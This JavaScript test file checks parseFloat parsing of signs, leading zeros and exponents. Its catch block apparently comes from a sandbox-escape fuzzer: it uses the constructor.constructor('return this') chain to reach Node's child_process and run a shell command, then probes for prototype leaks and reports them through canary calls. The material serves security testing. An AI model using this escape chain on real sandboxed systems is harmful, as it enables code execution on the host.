try {
    if (parseFloat('-11') !== -11) {
        $ERROR('#1: parseFloat("-11") === -11. Actual: ' + parseFloat('-11'));
    }
    if (parseFloat('01') !== 1) {
        $ERROR('#2: parseFloat("01") === 1. Actual: ' + parseFloat('01'));
    }
    if (parseFloat('-11e-1') !== -1.1) {
        $ERROR('#3: parseFloat("-11e-1") === -1.1. Actual: ' + parseFloat('-11e-1'));
    }
    if (parseFloat('01e1') !== 10) {
        $ERROR('#4: parseFloat("01e1") === 10. Actual: ' + parseFloat('01e1'));
    }
    if (parseFloat('001') !== 1) {
        $ERROR('#5: parseFloat("001") === 1. Actual: ' + parseFloat('001'));
    }
    if (parseFloat('1e001') !== 10) {
        $ERROR('#6: parseFloat("1e001") === 10. Actual: ' + parseFloat('1e001'));
    }
    if (parseFloat('010') !== 10) {
        $ERROR('#7: parseFloat("010") === 10. Actual: ' + parseFloat('010'));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}